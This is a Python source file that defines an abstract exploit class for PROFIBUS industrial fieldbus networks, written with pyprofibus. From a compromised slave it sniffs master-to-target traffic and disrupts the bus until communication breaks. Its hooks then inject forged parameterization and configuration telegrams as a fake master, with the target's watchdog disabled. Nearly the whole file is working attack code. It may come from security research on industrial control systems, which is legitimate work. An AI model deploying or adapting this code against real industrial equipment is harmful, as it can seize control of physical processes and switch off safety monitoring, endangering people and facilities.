from abc import ABC, abstractmethod
from collections import deque
import time
from serial import Serial

from pyprofibus.dp.dp import DpTelegram_ChkCfg_Req, DpTelegram_SetPrm_Req
from pyprofibus.pyprofisafe.slave_profisafe import SafetyData_ExchState
from pyprofibus.slave.Data_ExchState import Data_ExchState
from pyprofibus.slave.Slave import Slave
from pyprofibus.util import ProfibusError

class Exploit(ABC):

    slave: Slave
    target_address: int
    fake_master_address: int
    serial: Serial
    telegram_all_one: bytes
    read_bytes: deque
    prm_telegram: DpTelegram_SetPrm_Req
    cfg_telegram: DpTelegram_ChkCfg_Req

    def __init__(self, slave, target_address, fake_master_address):
        self.slave = slave
        self.target_address = target_address
        self.fake_master_address = fake_master_address
        self.serial = slave.phy.getSerial()
        self.telegram_all_one = b'\xFF\xFF'
        self.read_bytes = deque()
        self.prm_telegram = DpTelegram_SetPrm_Req(
            da=self.target_address,
            sa=self.fake_master_address,
            fc=0x4D,
            dsap=0x3D,
            ssap=0x3E
        )
        self.prm_telegram.wdFact1 = 0x00
        self.prm_telegram.wdFact2 = 0x00
        self.prm_telegram.minTSDR = 0x00
        self.prm_telegram.identNumber = 0x00
        self.prm_telegram.groupIdent = 0x02
        self.prm_telegram.addUserPrmData(b'\x58')
        self.prm_telegram.stationStatus = DpTelegram_SetPrm_Req.STA_LOCK # wd off

        self.cfg_telegram = DpTelegram_ChkCfg_Req(
            da=self.target_address,
            sa=self.fake_master_address
        )

    def run(self):
        self.checkState()
        self.listenForMasterToTargetCommunication()
        while True:
            self.disturbCommunication()
            if self.communicationBroke():
                time.sleep(0.5)
                break
        self.sendParameterization() #hook
        self.sendConfiguration() #hook
    
    def checkState(self):
        if not (isinstance(self.slave.getState(), Data_ExchState)
                or isinstance(self.slave.getState(), SafetyData_ExchState)):
            raise ProfibusError("""Cannot run the exploit, the corrupted
                                 slave is not in DX state.""")
    
   
    def listenForMasterToTargetCommunication(self):
        a = b''
        while True:
            a = self.serial.read(1)
            if a == b'':
                continue
            self.read_bytes.append(a)
            if len(self.read_bytes) == 5:
                if (self.read_bytes[0] == b'\x68') and (self.read_bytes[4] == b'\x00'): #should be self.target_address
                    print("now!")
                    self.read_bytes.clear()
                    return True
                print(self.read_bytes)
                self.read_bytes.popleft()
        #self.read_bytes.clear()
        #return False
    
    @abstractmethod
    def disturbCommunication(self):
        return

    @abstractmethod
    def communicationBroke(self) -> bool:
        return
    
    #hook
    def sendParameterization(self):
        return
    
    #hook
    def sendConfiguration(self):
        return
    


